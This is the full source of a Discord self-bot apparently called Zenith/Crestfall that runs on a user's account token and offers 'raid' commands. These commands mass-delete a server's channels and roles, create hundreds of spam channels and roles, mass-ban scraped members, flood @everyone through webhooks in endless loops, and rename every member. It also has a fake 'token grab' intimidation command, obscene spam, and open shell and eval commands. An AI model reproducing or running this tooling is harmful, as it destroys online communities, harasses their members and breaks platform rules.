#!/usr/bin/python
# -*- coding: utf-8 -*-

##### === MODULES === #####

import discord, random, json, aiohttp, aioconsole, httpx, asyncio, time, string, base64, os, io, contextlib, textwrap, requests as rq; from discord.ext import commands; from traceback import format_exception; from colorama import Fore; from threading import Thread; from multiprocessing import Process

##### === VARIABLES === #####

idlist = ['968117762281066526']
token = os.getenv('TOKEN')
prefix = '..'
msg = '[ @everyone ] zenith runs you ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||'

global hook
hook = False

languages = {'hu': 'Hungarian, Hungary', 'nl': 'Dutch, Netherlands', 'no': 'Norwegian, Norway', 'pl': 'Polish, Poland', 'pt-BR': 'Portuguese, Brazilian, Brazil', 'ro': 'Romanian, Romania', 'fi': 'Finnish, Finland', 'sv-SE': 'Swedish, Sweden', 'vi': 'Vietnamese, Vietnam', 'tr': 'Turkish, Turkey', 'cs': 'Czech, Czechia, Czech Republic', 'el': 'Greek, Greece', 'bg': 'Bulgarian, Bulgaria', 'ru': 'Russian, Russia', 'uk': 'Ukranian, Ukraine', 'th': 'Thai, Thailand', 'zh-CN': 'Chinese, China', 'ja': 'Japanese, Japan', 'zh-TW': 'Chinese, Taiwan', 'ko': 'Korean, Korea'}
locales = ['da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl', 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg', 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']

intents = discord.Intents.all()
client = commands.Bot(command_prefix = prefix, intents=intents, self_bot=True)
client.remove_command('help')
headers = {
  'Authorization':f'{token}',
}
requests = rq.Session()

wh = W = Fore.WHITE
bl = DB = Fore.LIGHTBLACK_EX
rs = RE = Fore.RESET

##### === ON-READY === #####

cToken = token[:25] + "*"*34

@client.event
async def on_ready():
  os.system('clear')
  print(f'''
{bl}       ████████╗         ┏━━━━━━━━━━━━━━━━━━ Info ━━━━━━━━━━━━━━━━┓
{bl}      ██████████╗           {wh}[Prefix] ⧉ {bl} ➜ {rs}{str(client.command_prefix)}
{bl}      ██║ ██  ██║           {wh}[On-set] ⧉ {bl} ➜ {rs}{client.user.name}#{client.user.discriminator}
{bl}      ████  ████║           {wh}[System] ⧉ {bl} ➜ {rs}Zenith V.4
{bl}      ╚████████╔╝           {wh}[SlfBot] ⧉ {bl} ➜ {rs}Crestfall on top. 
{bl}       █═█═█═█═╝         ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
''')

##### === FUNCTIONS === #####

def asciigen(length):
    asc = ""
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

def chunks(l, n):
    n = max(1, n)
    return (l[i:i+n] for i in range(0, len(l), n))

def get_channels(session):
    tasks = []
    for ch in channels:
      tasks.append(session.delete(f"https://discord.com/api/v9/channels/{ch}", headers=headers))
    return tasks

def get_roles(session):
    tasks = []
    for role in roles:
      tasks.append(session.delete(f"https://discord.com/api/v9/guilds/{guild2}/roles/{role}", headers=headers))
    return tasks

def make_channels(session):
    tasks = []
    for i in range(200):
        tasks.append(session.post(f'https://discord.com/api/v9/guilds/{guild2}/channels', headers=headers,json={'type':'0', 'name':f'zenith-runs-you'}))
    return tasks

def make_roles(session):
    tasks = []
    for i in range(100):
        name = 'zenith'
        payload = {
          'color': 10038562,
          'name':name,
        }
        tasks.append(session.post(f'https://discord.com/api/v9/guilds/{guild2}/roles', headers=headers, json=payload))
    return tasks

async def delroles():
    async with httpx.AsyncClient() as session:
        tasks = get_roles(session)
        await asyncio.gather(*tasks)

async def delchannels():
    async with httpx.AsyncClient() as session:
        tasks = get_channels(session)
        await asyncio.gather(*tasks)

async def bombchannels():
  async with httpx.AsyncClient() as session:
      tasks = make_channels(session)
      await asyncio.gather(*tasks)

async def rolebomb():
  async with httpx.AsyncClient() as session:
    tasks = make_roles(session)
    await asyncio.gather(*tasks)

async def deletech(ch, session):
  while True:
    rq = await session.delete(f"https://discord.com/api/v9/channels/{ch}", headers=headers)
    if rq.status_code == 429:
        json = rq.json() 
        await asyncio.sleep(json['retry_after'])
    else:
        break

async def whsend(link, session, message):
  data = {"content": f'{message}'}
  while True:
    async with await session.post(link, json=data, headers={'Content-Type':"application/json"}) as r:
      if r.status_code == 429:
        json = await r.json()
        await asyncio.sleep(json['retry_after'])
      else:
        break

async def baan(guild, id, session):
  while True:
    rq = await session.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{id}", headers=headers)
    if rq.status_code == 429:
        json = rq.json() 
        await asyncio.sleep(json['retry_after'])
    else:
        #logging.info(f'Executed {id}')
        break
  print(rq.status_code)


async def makech(name, session):
  while True:
    async with await session.post(f'https://discord.com/api/v9/guilds/{guild2}/channels', headers=headers,json={'type':'0', 'name':name}) as a:
      if a.status_code == 429:
        json = await a.json() 
        await asyncio.sleep(json['retry_after'])
      else:
        break

c1 = {
    "description": None,
    "features": ["NEWS"],
    "preferred_locale": "en-US",
    "rules_channel_id": None,
    "public_updates_channel_id": None
}

c2 = {
    "features": ["COMMUNITY"],
    "preferred_locale": "en-US",
    "rules_channel_id": "1",
    "public_updates_channel_id": "1"
}

async def comflood(gid, session):
    while True:
        try:
            async with await session.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{gid}", headers=headers, json=c2) as a:
                s = [200, 201, 204]
                if a.status_code in s:
                    print("Created community")
                elif a.status_code == 429:
                    x = a.json()
                    print(f"Rate limited, retrying in {x['retry_after']} seconds")
                    time.sleep(x['retry_after'])
        except:
            pass
        try:  
            async with await session.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{gid}", headers=headers, json=c1) as a:
                s = [200, 201, 204]
                if a.status_code in s:
                    print("Disabled community")
                elif a.status_code == 429:
                    x = a.json()
                    print(f"Rate limited, retrying in {x['retry_after']} seconds")
                    time.sleep(x['retry_after'])
        except:
            pass

##### === COMMANDS: HELP === #####

@client.command()
async def help(ctx, category=None):
    before = time.monotonic()
    try:
      await ctx.message.delete()
    except:
      pass
    ping = int((time.monotonic() - before) * 1000)
    if category == None:
        await ctx.send(f'''
```
          [ Crestfall ]
┌───────────────────────────────
│ help raid  ➤ shows raid cmds
│ help misc  ➤ shows misc cmds
│ help info  ➤ shows info cmds
│ help load  ➤ shows load cmds
└───────────────────────────────
  {client.command_prefix} | {client.user} | MAIN | {ping}ms
```
        ''')
    if category == 'raid':
        await ctx.send(f'''
```
          [ Crestfall ]
┌───────────────────────────────
│ nuke       ➤ wick bypass
│ nuke2      ➤ performance
│ community  ➤ no audit /takaso
│ chdel      ➤ del channels
│ chbomb     ➤ spam channels
│ rolenuke   ➤ spam roles
│ nicknuke   ➤ mass nickname
│ webhook    ➤ <on/off>
│ scrape     ➤ scrape membs
│ massban    ➤ bans scraped
└───────────────────────────────
  {client.command_prefix} | {client.user} | RAID | {ping}ms
```
        ''')
    elif category == 'misc':
        await ctx.send(f'''
```
          [ Crestfall ]
┌───────────────────────────────
│ manual     ➤ tries ping all
│ massgc     ➤ <i/@> mass gcadd
│ spamgc     ➤ <i/n> chng gcname
│ purge      ➤ <i> deletes msg
│ firstmsg   ➤ sends 1st msg
│ ping       ➤ trash wifi
│ status     ➤ <on/off/idle/dnd>
│ otax       ➤ <user> ukk stuff
│ ghost      ➤ <msg> ghostmsg
│ spam       ➤ <i> <msg>
│ unbanall   ➤ unbans every1
│ clone      ➤ clone channel
│ cum        ➤ exeter skids
└───────────────────────────────
  {client.command_prefix} | {client.user} | MISC | {ping}ms
```
        ''')
    elif category == 'info':
        await ctx.send(f'''
```
          [ Crestfall ]
┌───────────────────────────────
│ bash       ➤ </> bash terminal
│ eval       ➤ </> py emulator
│ base64     ➤ <encode/decode>
│ pingweb    ➤ <url> pings web
│ guildicon  ➤ get guild icon
│ banner     ➤ get guild banner
│ roleslist  ➤ get guild roles
└───────────────────────────────
  {client.command_prefix} | {client.user} | INFO | {ping}ms
```
        ''')
    
    elif category == 'load':
        await ctx.send(f'''
```
          [ Crestfall ]
┌───────────────────────────────
│ guildload  ➤ loads server tmpl
│ copyguild  ➤ clones guild
└───────────────────────────────
  {client.command_prefix} | {client.user} | LOAD | {ping}ms
```
        ''')

##### === COMMANDS: RAID === #####

channels = []
@client.command()
async def chdel(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  guild = ctx.guild
  global guild2
  guild2 = ctx.guild.id
  for channel in list(guild.channels):
    channels.append(channel.id)
  try:
    await delchannels()
  except Exception as e:
    print(f'{e}')

channels = []
@client.command()
async def chdel2(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  async with httpx.AsyncClient() as session:
    tasks = []
    for ch in ctx.guild.channels:
      tasks.append(asyncio.create_task(deletech(ch.id, session)))
    await asyncio.gather(*tasks)

@client.command()
async def chbomb(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  try:
    await bombchannels()
  except Exception as e:
    print(f'{e}')


@client.command()
async def chbomb2(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  async with httpx.AsyncClient() as session:
    tasks = []
    for i in range(200):
      tasks.append(asyncio.create_task(makech(f'nuked-by-zenith', session)))
    await asyncio.gather(*tasks)

@client.command()
async def community(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  async with httpx.AsyncClient() as session:
    tasks = []
    for i in range(200):
      tasks.append(asyncio.create_task(comflood(guild2, session)))
    await asyncio.gather(*tasks)

@client.command()
async def webhook(ctx, arg):
  global hook
  try:
    await ctx.message.delete()
  except:
    pass
  if arg == 'on' or arg == 'On':
    if hook:
      await ctx.send('```[Zenith] Pings Already On!```', delete_after=3)
    else:
      hook = True
      await ctx.send('```[Zenith] Pings Turned On!```', delete_after=3)
  if arg == 'off' or arg == 'Off':
    if hook == False:
      await ctx.send('```[Zenith] Pings Already Off!```', delete_after=3)
    else:
      hook = False
      await ctx.send('```[Zenith] Pings Turned Off!```', delete_after=3)

roles = []
@client.command()
async def roledel(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  guild = ctx.guild
  global guild2
  guild2 = ctx.guild.id
  for role in list(guild.roles):
    roles.append(role.id)
  try:
    await delroles()
  except Exception as e:
    print(f'{e}')

@client.command()
async def rolenuke(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  await roledel(ctx)

@client.command(aliases=['scrape'])
async def scrapemembs(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  global members2
  guild = ctx.guild
  members2 = await guild.chunk()
  global members
  members = []
  for member in members2:
    members.append(member.id)
  members.remove(ctx.author.id)
  await ctx.send(f'```[Zenith] Scraped {len(members)} members!```', delete_after=3)

@client.command()
async def massban(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  async with httpx.AsyncClient() as client:
    for i in chunks(members, 50):
      tasks = []
      for user in i:
        tasks.append(asyncio.create_task(baan(ctx.guild.id, user,client)))
      await asyncio.gather(*tasks)

@client.command()
async def hookping(ctx, amount:int):
  await ctx.message.delete()
  tasks = []
  async with httpx.AsyncClient() as session:
    for i in range(amount):
      for w in await ctx.guild.webhooks():
        try:
          tasks.append(whsend(w.url, session, '@everyone | ZENITH RUNS YOU'))
        except:
          pass
    await asyncio.gather(*tasks)

@client.command()
async def nicknuke(ctx):
  await ctx.message.delete()
  members = await ctx.guild.chunk()
  for member in members:
      try:
          await member.edit(nick='Zenith Runs You')
      except:
          pass

@client.command()
async def webhooknuke(ctx):
  await ctx.message.delete()
  for c in ctx.guild.text_channels:
    try:
      await c.create_webhook(name ="Zenith Runs You")
    except:
      pass

@client.event
async def on_guild_channel_create(channel):
  global hook
  if hook == True:
    webhook = await channel.create_webhook(name="Zenith Runs You")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        while True:
            await webhook.send(f"{msg}")

@client.command(aliases=['kill'])
async def nuke(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  await roledel(ctx)
  await chdel(ctx)
  await chbomb(ctx)

@client.command(aliases=['kill2'])
async def nuke2(ctx, name=None):
  if name==None:
    name = 'Zenith'
  try:
    await ctx.message.delete()
  except:
    pass
  guild = ctx.guild
  global guild2
  guild2 = ctx.guild.id
  for channel in list(guild.channels):
    channels.append(channel.id)
  await chdel2(ctx)
  await chbomb2(ctx)

##### === COMMANDS: MISC === #####

@client.command()
async def manual(ctx):
  await ctx.message.delete()
  count = 0
  roles = []
  for role in ctx.guild.roles:
    if role.name == '@everyone':
      pass
    else:
      roles.append(f'<@&{role.id}>')
  for c in ctx.guild.channels:
    for i in range(50):
      count += 1
      await ctx.send('**@everyone** ' + f' '.join([random.choice(roles) for i in range(5)]) + f' | {count}')

@client.command(aliases=['massgc', 'mass-gc'])
async def massaddgc(ctx, amount=int, *, user: discord.User = None):
        await ctx.message.delete()
        if user is None:
            await ctx.send('```[Zenith] ERROR! | User cannot be [None]```')
            return
        for friend in client.user.friends:
            if friend == user:
              continue
            for _i in range(amount):
                async with aiohttp.ClientSession() as session:
                  async with session.post(f"https://discord.com/api/v9/users/@me/channels", headers={'authorization':f'{token}','Content-type':'application/json'}, json={'recipients':[f'{user.id}',f'{friend.id}']}) as resp:
                    if resp.status == 200:
                        await ctx.send('''
> ```ini
> [ZENITH] GC Made
> ```
                        ''')
                        c = await resp.json()
                        channel = c['id']
                        async with session.delete(f'https://discord.com/api/v9/channels/{channel}', headers={'authorization':f'{token}','Content-type':'application/json'}) as resp:
                            if resp.status == 200:
                                await ctx.send('''
> ```ini
> [ZENITH] Left GC
> ```
                        ''')                            
                    if resp.status == 403:
                        await ctx.send('''
> ```ini
> [ZENITH] Unauthorized
> ```
                        ''')
                    if resp.status == 429 or resp.status == 400:
                        k = await resp.json()
                        await ctx.send(f'''
> ```ini
> [ZENITH] {resp.status} You are being ratelimited, wait after {k['retry_after']}
> ```
                        ''')
                        await asyncio.sleep(k['retry_after'])
                        break #currently like this till proxy support
                    else:
                        print(resp.status)

@client.command(aliases=["spam-groupchat", "spamgroupchat"])
async def spamgc(ctx,amount: int, *, args):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for _i in range(amount):
          name = args + ' | ' + ''.join(random.choice(string.ascii_letters) for i in range(1)) 
          await ctx.message.channel.edit(name=name)

@client.command(aliases=["jerkoff", "ejaculate", "orgasm"]) # from exeter
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')

@client.command()
async def massreact(ctx, amount, *, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=amount).flatten()
    for message in messages:
        await message.add_reaction(emote)

@client.command()
async def vcspam(ctx, ch1=None, ch2=None, uid=None, amount=10):
    if ch1==None or ch2==None:
        await ctx.message.edit(content = f"```[Zenith] vcspam [ch1] [ch2] <uid> <amount>```")  
    else:
        await ctx.message.delete()
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        for _i in range(int(amount)):
            requests.patch(f"https://discord.com/api/v8/guilds/{str(ctx.guild.id)}/members/{uid}",headers=headers,json={"channel_id": ch1})
            data = requests.patch(f"https://discord.com/api/v8/guilds/{str(ctx.guild.id)}/members/{uid}",headers=headers,json={"channel_id": ch2}).text
            if "rate limited" in data.lower(): 
                try:
                    j = json.loads(data)
                    r = j['retry_after']
                    w = r / 1000
                    await asyncio.sleep(w)
                except:
                    await asyncio.sleep(5)

@client.command(aliases=['mass-unban', "purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@client.command(aliases=['base64'])
async def b64(ctx, tp, *, strng):
  if tp == 'encode':
    message_bytes = strng.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    await ctx.send(f'```ini\n[{strng}]\n{base64_bytes}```')
  if tp == 'decode':
    base64_bytes = strng.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    await ctx.send(f'```ini\n[{strng}]\n{message}```')

@client.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(
            lambda m: m.author == client.user).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass

@client.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1,
                                           oldest_first=True).flatten())[0]
    await ctx.send(f'''
Content: {first_message.content}
Jump: {first_message.jump_url}
    ''')

@client.command()
async def ping(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  before = time.monotonic()
  message = await ctx.send("Pinging...")
  ping = (time.monotonic() - before) * 1000
  await message.edit(content=f"> `🏓 | Pong! {int(ping)} ms`")

@client.command()
async def status(ctx, status_code=None):
  try:
    await ctx.message.delete()
  except:
    pass
  if status_code == None:
    await ctx.send('```[Zenith] Status code cannot be None.```', delete_after=2)
  if status_code == 'idle':
    await client.change_presence(status_code=discord.Status.name.idle)
    await ctx.send('```[Zenith] Finished! | 🌙```')
  if status_code == 'dnd':
    await client.change_presence(status_code=discord.Status.name.dnd)
    await ctx.send('```[Zenith] Finished! | ⛔```')
  if status_code == 'off':
    await client.change_presence(status_code=discord.Status.name.offline)
    await ctx.send('```[Zenith] Finished! | ⚫```')
  if status_code == 'on' or status_code == 'online':
    await client.change_presence(status_code=discord.Status.name.online)
    await ctx.send('```[Zenith] Finished! | 🟢```')

@client.command(aliases=['otacks', 'tokengrab', 'tg', 'otax'])
async def _tokengrab(ctx, *, user: discord.User=None):
        await ctx.message.delete()
        if not user:
            user = ctx.author
        userid=str(user.id)
        encodedBytes = base64.b64encode(str(userid).encode("utf-8"))
        encodedid = str(encodedBytes, "utf-8")
        username = user.display_name
        discrim = user.discriminator
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
        middle = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))

        await ctx.send(f'''
>>> ```ini
[ TOKEN DECODER - FETCHED TOKEN ]
```
```diff
- {username}#{discrim} | 1st Part | Base64 : {encodedid}
- {username}#{discrim} | 2nd Part | Unix   : {middle}
- {username}#{discrim} | 3rd Part | HMAC   : {end}
+ {username}#{discrim} | Full Token        : {encodedid}.{middle}.{end}
```
        ''')

@client.command()
async def ghost(ctx, *, msg):
  await ctx.message.delete()
  x = await ctx.send(msg)
  await x.delete()

@client.command(aliases=['spam'])
async def s(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)

@client.command()
async def clone(ctx):
  await ctx.message.delete()
  x = await ctx.channel.clone(reason='')
  await ctx.channel.delete()
  await x.send("```[Zenith] Cloned channel successfully!```")

##### === COMMANDS: INFO === #####

@client.command(aliases=["vclag", "changeregion", "regionschange"])
async def regionspam(self, session, channel):
        vc = f"https://discord.com/api/v9/channels/{channel}"
        region = [
            'hongkong',
            'europe',
            'brazil',
            'us-central',
            'us-east',
            'sydney',
            'russia',
            'india',
            'japan',
            'us-west',
            'us-south',
            'singapore'
        ]
        rgc = random.choice(region)
        payload = {
            'rtc_region': str(rgc)
        }
        async with session.patch(vc, headers={'authorization':self.token}, json=payload) as req:
            if req.status == 200:
                await aioconsole.aprint(f"{req.status} - Changed region to {rgc}")
            if req.status == 429:
                k = await req.json()
                await aioconsole.aprint(f"{req.status} You are being ratelimited, wait after {k['retry_after']}")
                await asyncio.sleep(k['retry_after'])

@client.command(aliases=['servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    await ctx.send(ctx.guild.icon_url)

@client.command(aliases=['serverbanner'])
async def guildbanner(ctx):
    await ctx.message.delete()
    await ctx.send(ctx.guild.banner_url)

@client.command(aliases=['pw'])
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            await ctx.send(f'Exception: {e}')
        await ctx.send(f'Pinged `{website}`, [{r}]')

@client.command(aliases=['get-roles', 'cr', 'copy-roles', 'getroles', 'copyroles'])
async def gr(ctx):
    await ctx.message.delete()
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.send(roleStr)


def clean_code(content):
        if content.startswith("```") and content.endswith("```"):
            return "\n".join(content.split("\n")[1:])[:-3]
        else:
            return content

@client.command(aliases=['eval'])
async def _eval(ctx, *, code):
        stdout = io.StringIO()
        code = clean_code(code)

        local_variables = {
            "discord": discord,
            "commands": commands,
            "client": client,
            "ctx": ctx,
            "channel": ctx.channel,
            "author": ctx.author,
            "guild": ctx.guild,
            "message": ctx.message
        }

        stdout = io.StringIO()

        try:
            with contextlib.redirect_stdout(stdout):
                exec(
                    f"async def func():\n{textwrap.indent(code, '    ')}", local_variables,
                )

                obj = await local_variables["func"]()
                result = f"{stdout.getvalue()}\n-- {obj}\n"

        except Exception as e:
            result = "".join(format_exception(e, e, e.__traceback__))

        except:
          pass

        await ctx.send(f"**Code Input**\n```py\n{code}\n```\n\n**Code Output**\n```bash\n{result}\n```")

@client.command()
async def bash(ctx ,* args):
    try:
        await ctx.message.delete()
    except:
        pass
    cmd, arg = ctx.message.content.split(' ', 1)
    args = arg.split(' ', len(args))
    args = ' '.join(args[0:(len(args))])
    try:
        process = await asyncio.create_subprocess_shell(args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()
    except Exception as e:
        await ctx.channel.send(f'```bash\n{e}```')
        print(e)
    if stdout:
        try:
            await ctx.channel.send(f'Shell STDOUT: `$ {args}` ({process.pid}) exited with return code: {process.returncode}')
            await ctx.channel.send(f"```bash\n{stdout.decode()}\n```")
            return
        except discord.errors.HTTPException as e:
            if e.code == 50035:
                try:
                    with open('./data/bash_output.txt', 'w') as file:
                        file.write(f'{stdout.decode()}')
                    out = discord.File('./data/bash_output.txt')
                    try:
                        await ctx.channel.send(file=out)
                        return
                    except Exception as e:
                        await ctx.channel.send(e)
                        return
                except Exception as e:
                    await ctx.channel.send(e)
                    return
    elif stderr:
        try:
            await ctx.channel.send(f'Shell STDERR: `$ {args}` ({process.pid}) exited with return code: {process.returncode}')
            await ctx.channel.send(f"```\n{stderr.decode()}```")
            return
        except discord.errors.HTTPException as e:
            if e.code == 50035:
                try:
                    with open('bash_output.txt', 'w') as file:
                        file.write(f'{stdout.decode()}')
                    out = discord.File('bash_output.txt')
                    try:
                        await ctx.channel.send(file=out)
                        return
                    except Exception as e:
                        await ctx.channel.send(e)
                        return
                except Exception as e:
                    await ctx.channel.send(e)
                    return
    else:
        await ctx.channel.send(f'Command: `$ {args}` ({process.pid}) exited with return code {process.returncode}')
        return

##### === BACKUP === #####

@client.command(aliases=["copyguild", "copyserver"])
async def cloneguild(ctx, guild_id: int):
    await ctx.message.delete()
    guild2 = ctx.guild
    try:
        guild1 = client.get_guild(guild_id)
    except:
        return await ctx.send("Guild not found.")

    try:
      await guild2.edit(name=guild1.name)
    except Exception as e:
      print(e)
    for a in guild2.text_channels:
        try:
            await a.delete()
        except:
            pass
    for a in guild2.voice_channels:
        try:
            await a.delete()
        except:
            pass
    for a in guild2.categories:
        try:
            await a.delete()
        except:
            pass    
    for a in guild2.roles:
        try:
            await a.delete()
        except:
            pass
    for a in guild1.categories:
        try:
            await guild2.create_category(name = a.name, overwrites=a.overwrites)
        except:
            pass
    for a in guild1.text_channels:
        try:
            cat = discord.utils.get(guild2.categories, name = a.category.name)
            await guild2.create_text_channel(name = a.name, category = cat, position = a.position, topic = a.topic, slowmode_delay = a.slowmode_delay)
        except:
            pass
    for a in guild1.roles:
      try:
        await guild2.create_role(name=a.name, permissions=a.permissions,color=a.color, position=a.position)
      except:
        pass

    for a in guild1.voice_channels:
        try:
            cat = discord.utils.get(guild2.categories, name = a.category.name)
            await guild2.create_voice_channel(name = a.name, category = cat, position = a.position, user_limit = a.user_limit, bitrate = a.bitrate)
        except:
            pass

@client.command()
async def guildload(ctx, template=None):
  if template == None:
    await ctx.send("""
```[ZENITH] Invalid Template! | guildload <template>```
```Available Templates; \nexample\n```
      """)

  if template == "list":
    await ctx.send('''```Available Templates; \nexample\n```''')
  if template == "example":
    await ctx.guild.edit(name="Example Template")
    for c in ctx.guild.channels:
      await c.delete() 
    for role in ctx.guild.roles:
      try:
        await role.delete()
      except:
        pass

    status = await ctx.guild.create_category(" | Stats |")
    await ctx.guild.create_voice_channel(f"『📊』Members: {len(ctx.guild.members)}", category=status)

    infor = await ctx.guild.create_category(" | Information | ")
    await ctx.guild.create_text_channel(f"❔│ rules", category=infor)
    await ctx.guild.create_text_channel(f"🔰│ welcome", category=infor)
    await ctx.guild.create_text_channel(f"👀│ leaves", category=infor)

    generl = await ctx.guild.create_category(" | Texting Channels | ")
    await ctx.guild.create_text_channel(f"💬│ chat", category=generl)
    await ctx.guild.create_text_channel(f"😂│ memes", category=generl)
    await ctx.guild.create_text_channel(f"📃│ scripts", category=generl)

    vc = await ctx.guild.create_category(" | Voice Channels | ")
    await ctx.guild.create_voice_channel(f"🎼│ vc text", category=vc)
    await ctx.guild.create_voice_channel(f"🎶│ music", category=vc)
